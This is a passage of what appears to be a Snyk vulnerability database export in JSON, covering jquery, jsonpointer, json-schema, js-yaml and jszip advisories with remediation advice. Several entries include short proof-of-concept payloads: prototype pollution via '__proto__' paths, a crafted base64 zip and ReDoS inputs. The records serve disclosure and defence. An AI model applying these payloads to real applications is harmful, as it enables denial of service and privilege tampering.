understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GHSA](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [JQuery 3.5.0 Release](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [JQuery Upgrade Guide](https://jquery.com/upgrade-guide/3.5/)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Security Blog](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html)\n\n- [Exploit DB](https://www.exploit-db.com/exploits/49766)\n",
        "created_at": "2020-04-30T12:29:39Z",
        "updated_at": "2024-06-03T08:53:11Z",
        "problems": [
          {
            "id": "CVE-2020-11022",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.5.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.5.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=1.5.1 <3.5.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:F/RL:O/RC:R"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-04-29T23:02:09Z",
            "exploit": "Functional",
            "publication_time": "2020-04-29T23:02:09Z",
            "references": [
              {
                "url": "https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2",
                "title": "GHSA"
              },
              {
                "url": "https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77",
                "title": "GitHub Commit"
              },
              {
                "url": "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/",
                "title": "JQuery 3.5.0 Release"
              },
              {
                "url": "https://jquery.com/upgrade-guide/3.5/",
                "title": "JQuery Upgrade Guide"
              },
              {
                "url": "https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html",
                "title": "PoC"
              },
              {
                "url": "https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html",
                "title": "Security Blog"
              },
              {
                "url": "https://www.exploit-db.com/exploits/49766",
                "title": "Exploit DB"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSONPOINTER-1577288",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[jsonpointer](https://www.npmjs.com/package/jsonpointer) is a Simple JSON Addressing.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of a previous Prototype Pollution fix when the pointer components are arrays.\r\n\r\n### PoC\r\n\r\n```\r\nconst jsonpointer = require('jsonpointer');\r\n\r\n// jsonpointer.set({}, ['__proto__', '__proto__', 'polluted'], 'yes');\r\n// console.log(polluted); // ReferenceError: polluted is not defined\r\n\r\njsonpointer.set({}, [['__proto__'], ['__proto__'], 'polluted'], 'yes');\r\nconsole.log(polluted); // yes\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `jsonpointer` to version 5.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4)\n- [GitHub PR](https://github.com/janl/node-jsonpointer/pull/51)\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\n",
        "created_at": "2021-08-31T17:20:26Z",
        "updated_at": "2024-03-11T09:53:03Z",
        "problems": [
          {
            "id": "CVE-2021-23807",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-08-31T17:19:51Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-11-03T16:34:28Z",
            "references": [
              {
                "url": "https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/janl/node-jsonpointer/pull/51",
                "title": "GitHub PR"
              },
              {
                "url": "https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSONPOINTER-598804",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[jsonpointer](https://www.npmjs.com/package/jsonpointer) is a Simple JSON Addressing.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` function.\r\n\r\n### POC by NerdJS\r\n```\r\nconst jsonpointer = require('jsonpointer');\r\njsonpointer.set({}, '/__proto__/polluted', true);\r\nconsole.log(polluted);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `jsonpointer` to version 4.1.0 or higher.\n## References\n- [GitHub Commit](https://github.com/janl/node-jsonpointer/commit/234e3437019c6c07537ed2ad1e03b3e132b85e34)\n",
        "created_at": "2020-08-17T15:07:51Z",
        "updated_at": "2024-03-06T13:57:27Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.1.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.1.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.1.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "critical",
            "score": 9.8,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "critical",
        "slots": [
          {
            "disclosure_time": "2020-08-17T15:06:59Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-17T15:17:02Z",
            "references": [
              {
                "url": "https://github.com/janl/node-jsonpointer/commit/234e3437019c6c07537ed2ad1e03b3e132b85e34",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSONSCHEMA-1920922",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `validate` function, which when given a special payload will pollute `Object` with undesired attributes.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `json-schema` to version 0.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741)\n",
        "created_at": "2021-11-14T15:11:37Z",
        "updated_at": "2024-03-11T09:53:56Z",
        "problems": [
          {
            "id": "CVE-2021-3918",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.4.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.4.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.4.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.6,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-11-14T15:05:57Z",
            "exploit": "Not Defined",
            "publication_time": "2021-11-14T16:49:43Z",
            "references": [
              {
                "url": "https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSYAML-173999",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n[js-yaml](https://www.npmjs.com/package/js-yaml) is a human-friendly data serialization language.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The parsing of a specially crafted YAML file may exhaust the system resources.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `js-yaml` to version 3.13.0 or higher.\n## References\n- [GitHub Commit](https://github.com/nodeca/js-yaml/commit/a567ef3c6e61eb319f0bfc2671d91061afb01235)\n- [GitHub Issue](https://github.com/nodeca/js-yaml/issues/475)\n",
        "created_at": "2019-03-24T09:59:28Z",
        "updated_at": "2024-03-06T13:57:14Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.13.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.13.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=3.0.0 <3.13.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/RL:O"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2019-03-18T21:29:08Z",
            "exploit": "Not Defined",
            "publication_time": "2019-03-24T10:00:08Z",
            "references": [
              {
                "url": "https://github.com/nodeca/js-yaml/commit/a567ef3c6e61eb319f0bfc2671d91061afb01235",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/nodeca/js-yaml/issues/475",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSYAML-174129",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Execution",
        "description": "## Overview\n[js-yaml](https://www.npmjs.com/package/js-yaml) is a human-friendly data serialization language.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. When an object with an executable `toString()` property used as a map key, it will execute that function. This happens only for `load()`, which should not be used with untrusted data anyway. `safeLoad()` is not affected because it can't parse functions.\n## Remediation\nUpgrade `js-yaml` to version 3.13.1 or higher.\n## References\n- [GitHub Commit](https://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61)\n- [GitHub PR](https://github.com/nodeca/js-yaml/pull/480)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/813)\n",
        "created_at": "2019-04-07T11:15:19Z",
        "updated_at": "2024-03-06T13:58:14Z",
        "problems": [
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.13.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.13.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.13.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-04-05T15:54:43Z",
            "exploit": "Not Defined",
            "publication_time": "2019-04-07T15:54:43Z",
            "references": [
              {
                "url": "https://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/nodeca/js-yaml/pull/480",
                "title": "GitHub PR"
              },
              {
                "url": "https://www.npmjs.com/advisories/813",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSZIP-1251497",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n[jszip](https://www.npmjs.org/package/jszip) is a Create, read and edit .zip files with JavaScript http://stuartk.com/jszip\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Crafting a new zip file with filenames set to Object prototype values (e.g `__proto__,` `toString`, etc) results in a returned object with a modified prototype instance.\r\n\r\n### PoC\r\n```\r\nconst jszip = require('jszip');\r\n\r\nasync function loadZip() {\r\n// this is a raw buffer of demo.zip containing 2 empty files:\r\n// - \"file.txt\"\r\n// - \"toString\"\r\nconst demoZip = Buffer.from('UEsDBBQACAAIANS8kVIAAAAAAAAAAAAAAAAIACAAdG9TdHJpbmdVVA0AB3Bje2BmY3tgcGN7YHV4CwABBPUBAAAEFAAAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgACADDvJFSAAAAAAAAAAAAAAAACAAgAGZpbGUudHh0VVQNAAdPY3tg4FJ7YE9je2B1eAsAAQT1AQAABBQAAAADAFBLBwgAAAAAAgAAAAAAAABQSwECFAMUAAgACADUvJFSAAAAAAIAAAAAAAAACAAgAAAAAAAAAAAApIEAAAAAdG9TdHJpbmdVVA0AB3Bje2BmY3tgcGN7YHV4CwABBPUBAAAEFAAAAFBLAQIUAxQACAAIAMO8kVIAAAAAAgAAAAAAAAAIACAAAAAAAAAAAACkgVgAAABmaWxlLnR4dFVUDQAHT2N7YOBSe2BPY3tgdXgLAAEE9QEAAAQUAAAAUEsFBgAAAAACAAIArAAAALAAAAAAAA==', 'base64');\r\n\r\nconst zip = await jszip.loadAsync(demoZip);\r\nzip.files.toString(); // this will throw\r\nreturn zip;\r\n}\r\nloadZip();\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `jszip` to version 3.7.0 or higher.\n## References\n- [GitHub Commit](https://github.com/Stuk/jszip/commit/22357494f424178cb416cdb7d93b26dd4f824b36)\n- [GitHub Issue](https://github.com/Stuk/jszip/issues/762)\n- [GitHub PR](https://github.com/Stuk/jszip/pull/766)\n",
        "created_at": "2021-04-18T13:13:34Z",
        "updated_at": "2024-03-11T09:50:28Z",
        "problems": [
          {
            "id": "CVE-2021-23413",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.7.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.7.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.7.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-04-18T13:04:52Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-07-25T14:10:32Z",
            "references": [
              {
                "url": "https://github.com/Stuk/jszip/commit/22357494f424178cb416cdb7d93b26dd4f824b36",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/Stuk/jszip/issues/762",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/Stuk/jszip/pull/766",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-JSZIP-3188562",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
